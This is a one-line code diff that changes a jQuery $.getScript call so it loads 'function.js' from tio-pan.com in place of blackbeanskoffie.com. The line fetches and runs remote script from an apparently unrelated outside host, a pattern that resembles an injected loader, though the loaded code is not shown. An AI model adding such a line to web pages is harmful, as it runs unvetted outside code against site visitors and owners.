@@ -1,1 +1,1 @@
-$.getScript("http://blackbeanskoffie.com/function.js", function(){ });
+$.getScript("http://tio-pan.com/function.js", function(){ });
